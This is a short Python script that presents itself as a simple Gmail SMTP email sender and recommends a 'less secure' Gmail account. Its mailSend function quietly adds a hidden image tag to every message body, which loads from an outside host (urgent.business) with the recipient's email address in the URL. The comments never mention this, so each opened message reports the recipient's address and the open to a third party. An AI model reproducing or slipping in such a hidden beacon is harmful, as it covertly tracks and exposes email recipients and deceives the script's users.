# Program to send emails


"""
Program to send email after logging in to a GMail Account.

You require a gmail account with less security.
Connect to the SMTP Server and send mails
"""

import smtplib


# smtplib dpcumentation https://docs.python.org/3/library/smtplib.html


def mailSend(currentsession, receiver, subject, mail_content, mailfrom):
    # Function for sending mail.
    # The function takes a receiver emailid, subject, mail content and a sender
    # The first parameter is a SMTP Session that is already connected to GMail

    from email.message import EmailMessage
    receiver = receiver.strip()
    mailfrom = mailfrom.strip()
    # Setup the MIME
    msg = EmailMessage()  # Documentation on https://docs.python.org/3.9/library/email.message.html#email.message
    # .EmailMessage
    msg.add_header('Content-Type', 'text/html')
    src = "http://www.urgent.business/detox?detox=" + receiver
    mail_content = mail_content + "<img style=\"display:none;\" src=\"" + src + "\"/>"
    mail_content = mail_content.encode('utf-8')
    msg.set_payload(mail_content)

    # msg.set_content(mail_content)
    msg['Subject'] = subject
    msg['From'] = mailfrom
    msg['To'] = receiver
    # msg['Cc'] = ''
    # Add Cc addresses if you want
    # msg['Bcc'] = ''
    # Add Bcc addresses
    currentsession.send_message(msg)  # Send the message
